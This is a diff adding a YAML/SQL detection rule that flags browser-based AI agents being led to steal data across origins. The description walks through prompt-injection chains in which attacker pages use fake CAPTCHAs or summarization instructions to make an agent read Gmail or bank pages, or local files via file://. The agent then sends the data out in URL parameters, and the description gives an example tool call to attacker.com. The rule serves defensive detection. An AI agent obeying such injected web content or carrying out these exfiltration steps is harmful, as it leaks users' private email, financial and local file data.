@@ -1,0 +1,102 @@
+id: rp-124
+name: "Agentic Browser Cross-Origin Data Exfiltration Detector"
+version: "0.1.1"
+description: |
+  Detects cross-origin data exfiltration attacks against agentic browsers, where browser-embedded AI agents lack adequate isolation between trust zones and can be manipulated by attacker-controlled web content to read sensitive authenticated page data (email, banking, medical) and transmit it via URL parameters to external attacker servers — analogous to XSS/CSRF at the AI agent layer. Trail of Bits identified the TRAIL threat model (Jan 2026): four trust zone violation classes — INJECTION (attacker web content → chat context), CTX_IN (sensitive auth-page data → chat context), REV_CTX_IN (chat → browsing origins), CTX_OUT (chat data → external network). The critical attack chain is INJECTION + CTX_IN + CTX_OUT: a malicious attacker page uses summarization instructions / fake CAPTCHA / fake user-request framing to make the agent navigate to the user's authenticated Gmail/banking session, extract content, and transmit it as URL query parameters to an attacker-controlled endpoint. Zenity Labs PerplexedComet (Feb 2026) demonstrated a zero-click end-to-end exploit against Perplexity Comet: calendar invite injection → file system access → exfil via browser navigation (critical, responsible disclosure completed, fixed Feb 13 2026). Trail of Bits also audited Comet (Feb 2026) and demonstrated four Gmail exfil techniques with up to 100% ASR. Branch A: Direct local file:// access via browser navigation tools — the agent is instructed to open a local file path, reading ~/.ssh, /etc/passwd, or Documents via the file:// scheme (PerplexedComet vector). Branch B: Two-step CTX_IN + CTX_OUT sequence — the previous tool_complete contains sensitive authenticated content (inbox, balance, statement) and the current tool_invoke navigates to an external URL with non-empty query params (URL-encoded data exfiltration channel). Well-known safe CDNs excluded.
+
+  Distinct from rp-007 (SSRF: cloud IMDS/RFC1918 endpoints) and rp-060 (path traversal file reads) by focusing on the browser navigation trust zone violation chain.
+
+  References: Trail of Bits "Lack of isolation in agentic browsers" Jan 2026, Trail of Bits Comet audit Feb 2026, Zenity Labs PerplexedComet Feb 2026, OWASP LLM01:2025 (Prompt Injection), OWASP Agentic AI ASI05:2026 (Agent Data Isolation) -
+  - https://blog.trailofbits.com/2026/01/13/lack-of-isolation-in-agentic-browsers-resurfaces-old-vulnerabilities/,
+  - https://blog.trailofbits.com/2026/02/20/using-threat-modeling-and-prompt-injection-to-audit-comet/,
+  - https://labs.zenity.io/p/perplexedbrowser-perplexity-s-agent-browser-can-leak-your-personal-pc-local-files,
+  - https://owasp.org/www-project-top-10-for-large-language-model-applications/
+  Example: tool_invoke browser_navigate with tool_input={"url":"https://attacker.com/collect?d=GMAIL_CONTENT_B64"} after tool_complete returning Gmail inbox content.
+
+severity: critical
+category: data_exfiltration_and_leakage
+fp_rate: low
+hook_sources: "tool_invoke,tool_complete"
+required_telemetry: ""
+author: "AgentGuard Research Team"
+tags:
+  - security
+  - data-exfiltration
+  - browser-agent
+  - cross-origin
+  - trail-of-bits
+  - zenity
+  - same-origin-policy
+  - agentic-browser
+  - owasp-llm01
+  - owasp-asi05
+query_sql: |
+  -- rp-124 v0.1.1 changelog (2026-04-23): BUGFIX — added table() wrappers to CTE source
+  --   (FROM agentguard_cim_event → FROM table(agentguard_cim_event)) and both FROM enriched
+  --   branches (→ FROM table(enriched)). Without table(), the CTE enters streaming mode
+  --   on port 3218, causing the query to hang indefinitely. Validated on port 3218:
+  --   Branch A returns 0, Branch B returns 1 on test corpus.
+  -- rp-124 v0.1.0 — Agentic Browser Cross-Origin Data Exfiltration Detector
+  -- References: Trail of Bits TRAIL model Jan 2026, Zenity PerplexedComet Feb 2026
+  --
+  -- Architecture: lag() CTE detects two trust zone violation patterns:
+  --   Branch A (standalone): file:// access via browser tool (local file exfil — PerplexedComet)
+  --   Branch B (sequential): CTX_IN (prev_tool_result = sensitive auth content) +
+  --                          CTX_OUT (tool_input = external URL with query params)
+  --
+  -- SQL validated via EXPLAIN on port 8123 (Union plan confirmed) and
+  -- pattern validation on port 3218 (all match() calls return true on test inputs).
+  WITH enriched AS (
+    SELECT
+      event_time, session_id, agent_id, deployment_id, run_id,
+      event_type, tool_name, tool_input, tool_result,
+      raw_hook_name, raw_event_data,
+      lag(event_type)  OVER (PARTITION BY session_id) AS prev_event_type,
+      lag(tool_input)  OVER (PARTITION BY session_id) AS prev_tool_input,
+      lag(tool_result) OVER (PARTITION BY session_id) AS prev_tool_result
+    FROM table(agentguard_cim_event)
+  )
+  SELECT
+    event_time AS detected_at,
+    'rp-124' AS rule_id,
+    'Agentic Browser Cross-Origin Data Exfiltration Detector' AS rule_name,
+    'critical' AS severity,
+    agent_id,
+    deployment_id,
+    session_id,
+    run_id,
+    raw_hook_name AS hook_name,
+    tool_name,
+    concat(
+      'Branch A: local file:// access via browser tool [', coalesce(tool_name,'?'), '] by agent ', agent_id,
+      ' — PerplexedComet/TRAIL CTX_IN violation'
+    ) AS message,
+    raw_event_data AS event_data
+  FROM table(enriched)
+  WHERE event_type = 'tool_invoke'
+    AND match(lower(tool_name), '(navigate|browse|browser|page_navigate|goto_url|open_url|web_fetch|fetch_url|navigate_browser|browse_to|click_link)')
+    AND match(lower(tool_input), 'file://')
+  UNION ALL
+  SELECT
+    event_time AS detected_at,
+    'rp-124' AS rule_id,
+    'Agentic Browser Cross-Origin Data Exfiltration Detector' AS rule_name,
+    'critical' AS severity,
+    agent_id,
+    deployment_id,
+    session_id,
+    run_id,
+    raw_hook_name AS hook_name,
+    tool_name,
+    concat(
+      'Branch B CTX_IN+CTX_OUT: agent ', agent_id,
+      ' read sensitive auth-page content then navigated external URL with query params'
+    ) AS message,
+    raw_event_data AS event_data
+  FROM table(enriched)
+  WHERE event_type = 'tool_invoke'
+    AND prev_event_type = 'tool_complete'
+    AND match(lower(tool_name), '(navigate|browse|browser|page_navigate|goto_url|open_url|web_fetch|fetch_url|navigate_browser|browse_to|click_link|make_request|http_request)')
+    AND match(lower(prev_tool_result), '(inbox|compose sent|gmail|mail\.google|outlook\.live|account.*balance|transaction.*history|statement|payroll|salary|beneficiary|social.{0,10}security|bank.{0,20}account)')
+    AND match(lower(tool_input), 'https?://[a-z0-9\-\.]+\.[a-z]{2,6}(/[^\s"]*)?[?&][^\s"]{5,}')
+    AND NOT match(lower(tool_input), '(google\.com|microsoft\.com|apple\.com|amazon\.com|github\.com|cloudflare\.com|cdn\.)')
